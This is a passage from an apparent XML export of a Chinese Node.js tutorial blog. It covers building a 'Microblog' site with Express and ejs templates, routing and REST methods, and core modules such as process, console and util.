href=&apos;/stylesheets/bootstrap.css&apos; /&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;style type=&quot;text/css&quot;&gt; body &#123; padding-top: 60px; padding-bottom: 40px; &#125; &lt;/style&gt; &lt;link href=&quot;stylesheets/bootstrap-responsive.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;navbar navbar-fixed-top&quot;&gt; &lt;div class=&quot;navbar-inner&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;a class=&quot;btn btn-navbar&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.nav-collapse&quot;&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/a&gt; &lt;a class=&quot;brand&quot; href=&quot;/&quot;&gt;Microblog&lt;/a&gt; &lt;div class=&quot;nav-collapse&quot;&gt; &lt;ul class=&quot;nav&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;/&quot;&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/login&quot;&gt;登入&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/reg&quot;&gt;注册&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;container&quot; class=&quot;container&quot;&gt; 12345678910111213// footer.ejs&lt;/div&gt;&lt;hr /&gt;&lt;footer&gt; &lt;p&gt;&lt;a href=&quot;http://laibh.top&quot; target=&quot;_blank&quot;&gt;赖同学&lt;/a&gt; 2018&lt;/p&gt;&lt;/footer&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;/javascripts/jquery.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/javascripts/bootstrap.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 然后，在 index.ejs 添加以下内容 1234567891011121314151617181920212223242526272829303132&lt;% include header.ejs %&gt;&lt;div class=&quot;hero-unit&quot;&gt; &lt;h1&gt;欢迎来到 Microblog&lt;/h1&gt; &lt;p&gt;Microblog 是一个基于 Node.js 的微博系统。&lt;/p&gt; &lt;p&gt; &lt;a class=&quot;btn btn-primary btn-large&quot; href=&quot;/login&quot;&gt;登录&lt;/a&gt; &lt;a class=&quot;btn btn-large&quot; href=&quot;/reg&quot;&gt;立即注册&lt;/a&gt; &lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;span4&quot;&gt; &lt;h2&gt;Carbo 说&lt;/h2&gt; &lt;p&gt;东风破早梅 向暖一枝开 冰雪无人见 春从天上来&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;span4&quot;&gt; &lt;h2&gt;BYVoid 说&lt;/h2&gt; &lt;p&gt; Open Chinese Convert（OpenCC）是一个开源的中文简繁转换项目， 致力于制作高质量的基于统计预料的简繁转换词库。 还提供函数库(libopencc)、命令行简繁转换工具、人工校对工具、词典生成程序、 在线转换服务及图形用户界面。&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;span4&quot;&gt; &lt;h2&gt;佛振 说&lt;/h2&gt; &lt;p&gt;中州韵输入法引擎 / Rime Input Method Engine 取意历史上通行的中州韵， 愿写就一部汇集音韵学智慧的输入法经典之作。 项目网站设在 http://laibh.top 创造应用价值是一方面，更要坚持对好技术的追求，希望能写出灵动而易于扩展的代码， 使其成为一款个性十足的开源输入法。&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;&lt;% include footer.ejs %&gt; 访问 http://localhost:3000/ ，就可以看到以下内容 不知不觉，又篇幅有点长了，后面的是最后一章，将会介绍用户注册和登录已经发表微博的基本功能，希望可以在下一章一起学习。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩的Nodejs —— 使用 Node.js进行 Web 开发（上）]]></title>
    <url>%2F2018-09-21-NodeJs-Part5%E4%B8%8A.html</url>
    <content type="text"><![CDATA[本章从零开始用 Node.js 实现一个微博系统，功能包括路由控制、页面模板、数据库访问、用户注册、登录、用户会话等内容。介绍 Express 框架、MVC 设计模式、ejs 模板引擎以及 MongoDB 数据库的操作。由于篇幅看起来过长，就打算分成几节来记录，具体几节看后面情况，好了，让我们一起来实践用Node.js进行Web开发吧 使用 Node.js进行 Web 开发准备工作MVC（Model-View-Controller，模型-视图-控制器）是一种软件的设计模式，即把一个复杂的软件工程分解成三个层面：模型、视图和控制器。 模型是对象及其数据结构的实现，通常包含数据库操作 视图表示用户界面，在网站中通常就是 HTML 的组织结构 控制器用于处理用户请求和数据流、复杂模型，将输出传递给视图 称 PHP、ASP、JSP 为 “模板为中心的架构”，下表是两种 Web 开发架构的对比 特性 模板为中心架构 MVC架构 页面产生方式 执行并替换标签中的语句 由模板引擎生成 HTML 页面 路径解析 对应到文件系统 由控制器定义 数据访问 通过 SQL 语句查询或访问文件系统 对象关系模型 架构中心 脚本语言是静态 HTTP 服务器的扩展 静态 HTTP 服务器是脚本语言的补充 适用范围 小规模网站 大规模网站 学习难度 容易 较难 这两种架构都出自原始的 CGI，但不同之处是前者走了一条粗放扩张的发展路线，由于易学易用，在几年前应用较广，而随着互联网规模的扩大，后者优势逐渐体现，目前已经成为主流。 Node.js 本质上和 Perl 或 C++ 一样，都可以作为 CGI 扩展被调用，但它还可以跳过 HTTP 服务器，因为它本身就是。传统的架构中 HTTP 服务器的角色会由 Apache、Nginx、IIS 之类的软件来担任，而 Node.js 不需要。Node.js 提供了 http 模块，它是由 C++ 实现的，性能可靠，可以直接应用到生产环境。 Node.js 和其他的语言相比的另一个显著区别，在于它的原始封装程度较低。例如 PHP 中可以访问 $_REQUEST 获取客户端的 POST 或 GET 请求，通常不需要直接处理 HTTP 协议。这些语言要求由 HTTP 服务器来调用，因此需要设置一个 HTTP 服务器来处理客户端的请求，HTTP 服务器通过 CGI 或其他方式调用脚本语言解释器，将运行的结果传递回HTTP 服务器，最终再把内容返回给客户端。而在 Node.js 中，很多工作需要自己来做（并不是都要自己动手，因为有第三方框架的帮助）。 使用 http 模块Node.js 由于不需要另外的 HTTP 服务器，因此减少了一层抽象，给性能带来不少提升，但同时也因此而提高了开发难度。举例来说，要实现一个 POST 数据的表单，例如： 12345&lt;form method = "post" action="http://localhost:3000"&gt; &lt;input type="text" name="title"&gt; &lt;textarea name="text"&gt;&lt;/textarea&gt; &lt;input type="submit"&gt;&lt;/form&gt; 这个表单包含两个字段： title 和 text ，提交时以 POST 的方式将请求发送给 http://localhost:3000/。 假设我们要实现的功能是将这两个字段的东西原封不动地返回给用户，PHP 只需写两行代码，储存为 index.php 放在网站根目录下即可： 12echo $_POST['title']echo $_POST['text'] 在第三章使用了类似下面的方法（用 http模块） 123456789101112131415var http = require('http');var querystring = require('querystring');var server = http.createServer(function(req, res) &#123; var post = ''; req.on('data', function(chunk) &#123; post += chunk; &#125;); req.on('end', function() &#123; post = querystring.parse(post); res.write(post.title); res.write(post.text); res.end(); &#125;);&#125;).listen(3000); PHP 的实现要比Node.js容易得多。Node.js完成一个简单的任务需要这么复杂：先建立一个 http实例，在其请求处理函数手动编写 req 对象的事件监听器，当客户端数据到达时，将POST 数据暂存在闭包的变量中，直到 end事件触发，解析 POST 请求，处理后返回客户端。 PHP之所以这么简单也是因为它很多事情都封装好了，而Node.js 的 http 模块则是底层的接口。尽管使用起来复制，但是可以帮助我们对于 HTTP 协议的理解更加清晰。 实际上，Node.js 虽然提供了 http 模块，却不是让你直接用这个模块进行 Web 开发的。http 模块仅仅是一个 HTTP 服务器内核的封装，你可以用它做任何 HTTP 服务器能做的事情，不仅仅是做一个网站，甚至实现一个 HTTP 代理服务器都行。你如果想用它直接开发网站，那么就必须手动实现所有的东西了，小到一个 POST 请求，大到 Cookie、会话的管理。当你用这种方式建成一个网站的时候，你就几乎已经做好了一个完整的框架了。 Express 框架npm 提供了大量的第三方模块，其中 Express 是目前最稳定、使用最广泛，而且 Node.js 官方推荐的唯一一个 Web 开发框架。Express 除了为 http 模块提供了更高层的接口外，还实现了许多功能，其中包括： 路由控制 模板解析支持 动态视图 用户会话 CSRF 保护 静态文件服务 操作控制器 访问日志 缓存 插件支持 需要指出的是，Express 不是一个无所不包的全能框架，像 Rails 或 Django 那样实现了模板引擎甚至 ORM （Object Relation Model，对象关系模型）。架，多数功能只是对 HTTP 协议中常用操作的封装，更多的功能需要插件或者整合其他模块来完成。 下面是 用 Express 重新实现的前面的例子 12345678var express = require('express');var app = express.createServer();app.use(express.bodyParser());app.all('/', function()&#123; res.send(req.body.title + req.body.text);&#125;);app.listen(3000); 快速开始安装 Express1$ npm install -g express 安装完成后， 使用 express --help 查看帮助信息 1234567891011121314151617181920C:\Users\Administrator&gt;express --help Usage: express [options] [dir] Options: --version output the version number -e, --ejs add ejs engine support --pug add pug engine support --hbs add handlebars engine support -H, --hogan add hogan.js engine support -v, --view &lt;engine&gt; add view &lt;engine&gt; support (dust|ejs|hbs|hjs|jade|pug|twig|vash) (defaults to jade) --no-view use static html instead of view engine -c, --css &lt;engine&gt; add stylesheet &lt;engine&gt; support (less|stylus|compass|sass) (defaults to plain css) --git add .gitignore -f, --force force on non-empty directory -h, --help output usage information Express 在初始化一个项目的时候需要指定模板引擎，默认支持Jade和ejs，为了降低学习难度推荐使用 ejs ，同时暂时不添加 CSS 引擎和会话支持。（ejs （Embedded JavaScript） 是一个标签替换引擎，其语法与 ASP、PHP 相似，易于学习，目前被广泛应用。Express 默认提供的引擎是 jade，它颠覆了传统的模板引擎，制定了一套完整的语法用来生成 HTML 的每个标签结构，功能强大但不易学习。） 建立工程通过以下命令建立网站基本结构： 1express -e microblog 当前目录下出现了子目录 microblog，并且产生了一些文件： 1234567891011121314151617181920212223242526272829F:\赖彬鸿\git-project\usual\LearnNodeJsCode\express&gt;express -e microblog warning: option `--ejs' has been renamed to `--view=ejs' create : microblog\ create : microblog\public\ create : microblog\public\javascripts\ create : microblog\public\images\ create : microblog\public\stylesheets\ create : microblog\public\stylesheets\style.css create : microblog\routes\ create : microblog\routes\index.js create : microblog\routes\users.js create : microblog\views\ create : microblog\views\error.ejs create : microblog\views\index.ejs create : microblog\app.js create : microblog\package.json create : microblog\bin\ create : microblog\bin\www change directory: &gt; cd microblog install dependencies: &gt; npm install run the app: &gt; SET DEBUG=microblog:* &amp; npm start 按照提示进入 microblog 文件夹，安装依赖 ，打开 目录中的 package.json 文件，可以看到具体的内容。 12345678910111213141516&#123; "name": "microblog", "version": "0.0.0", "private": true, "scripts": &#123; "start": "node ./bin/www" &#125;, "dependencies": &#123; "cookie-parser": "~1.4.3", "debug": "~2.6.9", "express": "~4.16.0", "http-errors": "~1.6.2", "jade": "~1.11.0", "morgan": "~1.9.0" &#125;&#125; 启动服务器npm start启动服务器，可以看到以下内容，打开 http://localhost:3000/ 工程的结构除了 package.json，它只产生了三个个 JavaScript 文件 app.js ， routes/index.js和routes/users.js。可以看出来这里将路由进行了分类，其中users.js 的是路由的路径前缀有user的。模板引擎 ejs 也有两个文件 index.ejs 和layout.ejs，此外还有样式表 style.css。 app.js1234567891011121314151617181920212223242526272829303132333435363738394041var createError = require('http-errors');var express = require('express');var path = require('path');var cookieParser = require('cookie-parser');var logger = require('morgan');var indexRouter = require('./routes/index');var usersRouter = require('./routes/users');var app = express();// view engine setupapp.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs');app.use(logger('dev'));app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, 'public')));app.use('/', indexRouter);app.use('/users', usersRouter);// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render('error');&#125;);module.exports = app; var indexRouter = require(‘./routes/index’); var usersRouter = require(‘./routes/users’); 可以看出来 express 将路由分成了两个，并且进行了封装，在相对应的页面是用 router.get去替换教程中 app.get，然后再将 router exports 出来。 app.set 是 Express 的参数设置工具，接受一个键（key）和一个值（value），可用的参数如下所示。 basepath ：基础地址，通常用于 res.redirect() 跳转。 views ：视图文件的目录，存放模板文件。 view engine ：视图模板引擎。 view options ：全局视图参数对象。 view cache ：启用视图缓存。 case sensitive routes ：路径区分大小写。 strict routing ：严格路径，启用后不会忽略路径末尾的“ / ”。 jsonp callback ：开启透明的 JSONP 支持。 routes/index.js和routes/users.jsroutes/index.js以及users.js 是路由文件，相当于控制器，用于组织展示的内容： 1234567891011//index.js var express = require('express');var router = express.Router();/* GET home page. */router.get('/', function(req, res, next) &#123; res.render('index', &#123; title: 'Express' &#125;);&#125;);module.exports = router; 12345678910// users.jsvar express = require('express');var router = express.Router();/* GET users listing. */router.get('/', function(req, res, next) &#123; res.send('respond with a resource');&#125;);module.exports = router; 两个文件的区别在于 users.js 的路由前面还有个 users的前缀，即是访问 http://localhost:3000/users ,才可以看到 respond with a resource。这个在 app.js中可以看出来。 res.render(&#39;index&#39;, { title: &#39;Express&#39; }),功能是调用模板解析引擎，翻译名为 index 的模板，并传入一个对象作为参数，这个对象只有一个属性，即 title: &#39;Express&#39; 。 index.ejsndex.ejs 是模板文件，即 routes/index.js 中调用的模板，内容是： 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 它的基础是 HTML 语言，其中包含了形如 &lt;%= title %&gt; 的标签，功能是显示引用的变量，即 res.render 函数第二个参数传入的对象的属性。 路由控制工作原理当通过浏览器访问 app.js 建立的服务器时，会看到一个简单的页面，实际上它已经完成了许多透明的工作，现在就来解释一下它的工作机制，以帮助理解网站的整体架构。访问 http://localhost:3000，浏览器会向服务器发送以下请求： 1234567891011GET / HTTP/1.1Host: localhost:3000Connection: keep-alivePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1534228662871; scroll-cookie=0|/ 其中第一行是请求的方法、路径和 HTTP 协议版本，后面若干行是 HTTP 请求头。 app 会解析请求的路径，调用相应的逻辑。最终视图模板生成 HTML 页面，返回给浏览器，返回的内容是： 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Express&lt;/title&gt; &lt;link rel='stylesheet' href='/stylesheets/style.css' /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Express&lt;/h1&gt; &lt;p&gt;Welcome to Express&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 浏览器在接收到内容以后，经过分析发现要获取 /stylesheets/style.css，因此会再次向服务器发起请求。app.js 中并没有一个路由规则指派到 /stylesheets/style.css，但 app 通过app.use(express.static(__dirname + &#39;/public&#39;)) 配置了静态文件服务器，因此 /stylesheets/style.css 会定向到 app.js 所在目录的子目录中的文件 public/stylesheets/style.css，向客户端返回以下信息： 12345678910111213141516171819HTTP/1.1 200 OKX-Powered-By: ExpressAccept-Ranges: bytesCache-Control: public, max-age=0Last-Modified: Fri, 21 Sep 2018 02:09:44 GMTETag: W/"6f-165f9e3dc52"Content-Type: text/css; charset=UTF-8Content-Length: 111Date: Fri, 21 Sep 2018 02:25:45 GMTConnection: keep-alivebody &#123; padding: 50px; font: 14px "Lucida Grande", Helvetica, Arial, sans-serif;&#125;a &#123; color: #00B7FF;&#125; 由 Express 创建的网络架构如下图 这是一个典型的 MVC 架构，浏览器发起请求，由路由控制器接受，根据不同的路径定向到不同的控制器。控制器处理用户的具体请求，可能会访问数据库中的对象，即模型部分。控制器还要访问模板引擎，生成视图的 HTML，最后再由控制器返回给浏览器，完成一次请求。 创建路由规则当我们在浏览器中访问譬如 http://localhost:3000/abc 这样不存在的页面时，服务器会在响应头中返回 404 Not Found 错误,这是因为 /abc 是一个不存在的路由规则，而且它也不是一个 public 目录下的文件，所以Express返回了404 Not Found的错误。 假设要创建一个地址为 /hello 的页面，内容是当前的服务器时间，在 routes/index.js 中加一行 123router.get('/hello', function(req, res, next) &#123; res.send('The time is ' + new Date().toString());&#125;); 重启 app.js，在浏览器中访问 http://localhost:3000/hello ，就可以看到输出的时间。刷新网页看到时间的变化，同样可以在 routes/users.js 中添加，那就是要访问 http://localhost:3000/users/hello . 服务器在开始监听之前，设置好了所有的路由规则，当请求到达时直接分配到响应函数。routes.get 是路由规则创建函数，它接受两个参数，第一个参数是请求的路径，第二个参数是一个回调函数，该路由规则被触发时调用回调函数，其参数表传递三个参数，分别是 req， res 和 next，表示请求信息，响应信息和next()在函数体内调用以将控制权交给下一个回调。 路径匹配上面的例子是为固定的路径设置路由规则，Express 还支持更高级的路径匹配模式。例如想要展示一个用户的个人页面，路径为 /users/[username]，可以用下面的方法定义路由规则： 12345// router/users.jsrouter.get('/:username', function(req, res, next) &#123; res.send('user: ' + req.params.username);&#125;); 修改以后重启 app.js，访问 http://localhost:3000/users/lbh， 可以看到页面显示了以下内容： user: lbh 路径规则 /:username 会被自动编译为正则表达式，类似于 \/user\/([^\/]+)\/?这样的形式。路径参数可以在响应函数中通过 req.params 的属性访问。 路径规则同样支持 JavaScript 正则表达式，例如 router.get(\/user\/([^\/]+)\/?,callback) 。这样的好处在于可以定义更加复杂的路径规则，而不同之处是匹配的参数是匿名的，因此需要通过 req.params[0] 、 req.params[1] 这样的形式访问。 REST 风格的路由规则Express 支持 REST 风格的请求方式，REST 的意思是 表征状态转移（Representational State Transfer），它是一种基于 HTTP 协议的网络应用的接口风格，充分利用 HTTP 的方法实现统一风格接口的服务。HTTP 协议定义了以下8种标准的方法。 GET：请求获取指定资源。 HEAD：请求指定资源的响应头。 POST：向指定资源提交数据。 PUT：请求服务器存储一个资源。 DELETE：请求服务器删除指定资源。 TRACE：回显服务器收到的请求，主要用于测试或诊断。 CONNECT：HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。 OPTIONS：返回服务器支持的HTTP请求方法。 其中我们经常用到的是 GET、POST、PUT 和 DELETE 方法。根据 REST 设计模式，这4种方法通常分别用于实现以下功能。 GET：获取 POST：新增 PUT：更新 DELETE：删除 它们的特点 请求方式 安 全 幂 等 GET 是 是 POST 否 否 PUT 否 是 DELETE 否 是 所谓的安全是指没有副作用，即请求不会对资源产生变动，连续访问多次所获得的结果不受访问者的影响。而幂等指的是重复请求多次与请求一次的效果是一样的，比如获取和更新操作是幂等的，这与新增不同。删除也是幂等的，即重复删除一个资源，和删除一次是一样的。 Express 对每种 HTTP 请求方法都设计了不同的路由绑定函数，例如前面例子全部是 router.get ，表示为该路径绑定了 GET 请求，向这个路径发起其他方式的请求不会被响应。 下表是 Express 支持的所有 HTTP 请求的绑定函数。（没有封装前） 请求方式 绑定函数 GET app.get(path, callback) POST app.post(path, callback) PUT app.put(path, callback) DELETE app.delete(path, callback) PATCH app.patch(path, callback) TRACE app.trace(path, callback) CONNECT app.connect(path, callback) OPTIONS app.options(path, callback) 所有方法 app.all(path, callback) 绑定某个路径的 POST 请求，则可以用 app.post(path, callback) 的方法。需要注意的是 app.all 函数，它支持把所有的请求方式绑定到同一个响应函数，是一个非常灵活的函数。 控制权转移Express 支持同一路径绑定多个路由响应函数，例如： 123456app.all('/user/:username', function(req, res) &#123; res.send('all methods captured');&#125;);app.get('/user/:username', function(req, res) &#123; res.send('user: ' + req.params.username);&#125;); 但当你访问任何被这两条同样的规则匹配到的路径时，会发现请求总是被前一条路由规则捕获，后面的规则会被忽略。原因是 Express 在处理路由规则时，会优先匹配先定义的路由规则，因此后面相同的规则被屏蔽。 Express 提供了路由控制权转移的方法，即回调函数的第三个参数 next ，通过调用next() ，会将路由控制权转移给后面的规则，例如： 1234567app.all('/user/:username', function(req, res) &#123; res.send('all methods captured'); next();&#125;);app.get('/user/:username', function(req, res) &#123; res.send('user: ' + req.params.username);&#125;); 当访问被匹配到的路径时，如 http://localhost:3000/user/lbh ，会发现终端中打印了 all methods captured ，而且浏览器中显示了 user: lbh 。这说明请求先被第一条路由规则捕获，完成 console.log 使用 next() 转移控制权，又被第二条规则捕获，向浏览器返回了信息。 这是一个非常有用的工具，可以让我们轻易地实现中间件，而且还能提高代码的复用程度。例如我们针对一个用户查询信息和修改信息的操作，分别对应了 GET 和 PUT 操作，而两者共有的一个步骤是检查用户名是否合法，因此可以通过 next() 方法实现： 1234567891011121314151617181920212223// router/users.jsvar users = &#123; 'lbh': &#123; name: 'lbh', website: 'http://laibh.top' &#125;&#125;;router.all('/:username', function (req, res, next) &#123; // 检查用户是否存在 if (users[req.params.username]) &#123; next(); &#125; else &#123; next(new Error(req.params.username + ' does not exist.')); &#125;&#125;);router.get('/:username', function (req, res) &#123; // 用户一定存在，直接展示 res.send(JSON.stringify(users[req.params.username]));&#125;);router.put('/:username', function (req, res) &#123; // 修改用户信息 res.send('Done');&#125;); 访问 http://localhost:3000/users/lbh 可以看到： {“name”:”lbh”,”website”:”http://laibh.top&quot;} 访问其他网址，例如： http://localhost:3000/users/xxx，则会出现 xxx does not exist. 上面例子中， router.all 定义的这个路由规则实际上起到了中间件的作用，把相似请求的相同部分提取出来，有利于代码维护其他 next 方法如果接受了参数，即代表发生了错误。使用这种方法可以把错误检查分段化，降低代码耦合度。 未完待续，后面即将讲模板引擎、建立微博网站、用户注册登录、发表微博等等]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩的Nodejs —— Node.js核心模块]]></title>
    <url>%2F2018-09-20-NodeJs-Part4.html</url>
    <content type="text"><![CDATA[核心模块是 Node.js 的心脏，它由一些精简而高效的库组成，为Node.js 提供了基本的 API。本章主要内容： 全局对象 常用工具 事件机制 文件系统访问 HTTP 服务器与客户端 这一章比较重要，所以字数比较多。 Node.js核心模块全局对象JavaScript 中有一个特殊的对象，称为全局对象（Global Object），它及其他属性都可以在程序的任何地方访问，即全局变量。在浏览器 JavaScript 中，通常 window 是全局对象，而 Node.js 中的全局对象是 global,所有全局变量（除了 global 本身以外）都是 global 对象的属性。 全局对象与全局变量global 最根本的作用是作为全局变量的宿主，按照 ECMAScript 的定义，满足一下条件的变量是全局变量： 在最外层定义的变量 全局对象的属性 隐式定义的变量（未定义直接赋值的变量） Node.js 中 不可能在最外层定义变量，因为所有用户代码都是属于当前模块的，而模块本身不是最外层上下文。 processprocess 是一个全局变量，即 global 对象的属性，它用于描述当前的 Node.js 进程状态的对象，提供了一个与操作系统的简单接口。通常用于写本地命令行程序的时候。 以下介绍 process 对象的一些最简单的成员方法。 process.argv命令行参数数组，第一个元素是 node,第二个元素是脚本文件名，从第三个元素开始每个元素是一个运行参数 1console.log(process.argv); 将以上代码存储为 argv.js，通过以下命令运行： 1234567891011121314151617181920Microsoft Windows [版本 6.1.7601]版权所有 (c) 2009 Microsoft Corporation。保留所有权利。C:\Users\Administrator&gt;cd DesktopC:\Users\Administrator\Desktop&gt;cd nodeJsC:\Users\Administrator\Desktop\nodeJs&gt;node argv.js[ 'E:\\Program Files\\NodeJS\\node.exe', 'C:\\Users\\Administrator\\Desktop\\nodeJs\\argv.js' ]C:\Users\Administrator\Desktop\nodeJs&gt;node argv.js 2018 name=lbh --v "Lbh"[ 'E:\\Program Files\\NodeJS\\node.exe', 'C:\\Users\\Administrator\\Desktop\\nodeJs\\argv.js', '2018', 'name=lbh', '--v', 'Lbh' ]C:\Users\Administrator\Desktop\nodeJs&gt; process.stdout是标准输出流，通常使用的 console.log(),想标准输出打印字符，而 process.stdout.write()函数提供了更底层的接口。 process.stdin是标准输入流，初始时它是被暂停的，要想从标准输入读取数据，你必须恢复流，并手动编写流的事件响应函数。 12345process.stdin.resume();process.stdin.on('data', function()&#123; process.stdout.write('read from console:' + data.toString());&#125;); process.nextTick(callback)为时间循环设置一项任务，NodeJs 会在下次事件循环调响应时调用 callback 。 因为一个 Node.js 进程只有一个线程，因此在任何时刻都只有一个事件在执行。如果这个事件占用大量的 CPU 时间，执行事件循环中的下一个事件就需要等待很久，因此 Node.js 的一个编程原则就是尽量缩短每个事件的执行时间。 process.nextTick() 提供了一个这样的工具，可以把复杂的工作拆散，变成一个个较小的事件。 1234567function doSometing(args, callback) &#123; somethingComplicated(args); callback();&#125;doSomething(function onEnd()&#123; compute();&#125;) 假设 compute() 和 somethingComplicated() 是两个较为耗时的函数，以上的程序在调用 doSomething() 时会先执行 somethingComplicated() ，然后立即调用回调函数，在 onEnd() 中又会执行 compute() 。下面用 process.nextTick() 改写上面的程序： 1234567function doSomething(args, callback)&#123; somethingComplicated(args); process.nextTick(callback);&#125;doSomething(function onEnd()&#123; compute();&#125;) 改写后的程序会把上面耗时的操作拆分为两个事件，减少每个事件的执行时间，提高事件响应速度。不要使用 setTimeout(fn,0) 代替 process.nextTick(callback) ，前者比后者效率要低得多。 其他有关的， process api consoleconsole 用于提供控制台标准输出，向标准输出流（stdout）或标准错误流（stderr）输出字符。 console.log()想标准输出流打印字符并换行符结束。console.log 接受若干个参数，如果只有一个参数，则输出这个参数的字符串形式，如果有多个参数，则以类似 C 语言 printf() 命令的格式输出。第一个参数是一个字符串，如果没有参数，只打印一个换行。 console.error()与 console.log() 用法相同，只是向标准错误流输出。 console.trace()向标准错误流输出当前的调用栈。 1console.trace (); 运行结果为： 123456789101112131415C:\Users\Administrator\Desktop\nodeJs&gt;node consoletrace.jsTrace at Object.&lt;anonymous&gt; (C:\Users\Administrator\Desktop\nodeJs\consoletrace.js:1:71) at Module._compile (module.js:652:30) at Object.Module._extensions..js (module.js:663:10) at Module.load (module.js:565:32) at tryModuleLoad (module.js:505:12) at Function.Module._load (module.js:497:3) at Function.Module.runMain (module.js:693:10) at startup (bootstrap_node.js:191:16) at bootstrap_node.js:612:3C:\Users\Administrator\Desktop\nodeJs&gt; 常用工具 utilutil 是一个 Node.js 核心模块，提供常用函数的集合，用于弥补核心 JavaScript 的功能过于精简的不足。 util.inheritsutil.inherits(constructor, superConstructor) 是一个实现对象间原型继承的函数。JavaScript 面向对象特性是基于原型的，与常见的基于类的不同。JavaScript 没有提供对象继承的语言级别特性，而是通过原型复制来实现的。 util.inherits 的用法 123456789101112131415161718192021222324252627// util.inheritsvar util = require('util');function Base()&#123; this.name = 'base'; this.base = 2018; this.sayHello = function() &#123; console.log('Hello' + this.name); &#125;&#125;Base.prototype.showName = function()&#123; console.log(this.name);&#125;function Sub()&#123; this.name = 'sub';&#125;util.inherits(Sub, Base);var objBase = new Base();objBase.showName();objBase.sayHello();console.log(objBase);var objSub = new Sub();objSub.showName();// objSub.sayHello();console.log(objSub); 运行结果 1234567C:\Users\Administrator\Desktop\nodeJs&gt;node util.inherits.jsbaseHellobaseBase &#123; name: 'base', base: 2018, sayHello: [Function] &#125;subSub &#123; name: 'sub' &#125; 上面例子定义了一个基础对象 Base 和一个继承自 Base 的 Sub ， Base 有三个在构造函数内定义的属性和一个原型中定义的函数，通过 util.inherits 实现继承。可以看到 Sub 仅仅继承了 Base 在原型中定义的函数，而构造函数内部创建的属性不会被 console.log 作为对象的属性输出。如果去掉 objSub.sayHello(); 这行的注释，将会看到： 12345678910111213141516C:\Users\Administrator\Desktop\nodeJs\util.inherits.js:26objSub.sayHello(); ^TypeError: objSub.sayHello is not a function at Object.&lt;anonymous&gt; (C:\Users\Administrator\Desktop\nodeJs\util.inherits.js:26:8) at Module._compile (module.js:652:30) at Object.Module._extensions..js (module.js:663:10) at Module.load (module.js:565:32) at tryModuleLoad (module.js:505:12) at Function.Module._load (module.js:497:3) at Function.Module.runMain (module.js:693:10) at startup (bootstrap_node.js:191:16) at bootstrap_node.js:612:3 util.inspectutil.inspect（object, [showHidden], [depth]. [colors]）是一个将任意对象转换为字符串的方法，通常用于调试和错误输出。它至少接受一个参数 object ，即要转换的对象。 showHidden 是一个可选参数，如果值为 true，将会输出更多隐藏信息。 depth 表示最大递归的成熟，如果对象很复杂。可以指定层数以控制输出消息的对少，如果不指定 depth,默认会递归 2 层， 指定 null 表示将不限递归层数完整遍历对象。 colors 的值为true,输出格式将会以 ANSI颜色编码，通常用于在终端显示更漂亮的效果。 特别要指出的是， util.inspect 并不会简单地直接把对象转换为字符串，即使该对象定义了 toString 方法也不会调用。 123456789101112// util.inspectvar util = require('util');function Person() &#123; this.name = 'lbh' this.toString = function()&#123; return this.name &#125;&#125;var obj = new Person();console.log(util.inspect(obj));console.log(util.inspect(obj, true)); 运行结果 123456789101112C:\Users\Administrator\Desktop\nodeJs&gt;node util.inspect.jsPerson &#123; name: 'lbh', toString: [Function] &#125;Person &#123; name: 'lbh', toString: &#123; [Function] [length]: 0, [name]: '', [arguments]: null, [caller]: null, [prototype]: &#123; [constructor]: [Circular] &#125; &#125; &#125; 当设置有颜色的输出 1console.log(util.inspect(obj, true, true,43)); 结果如下 util 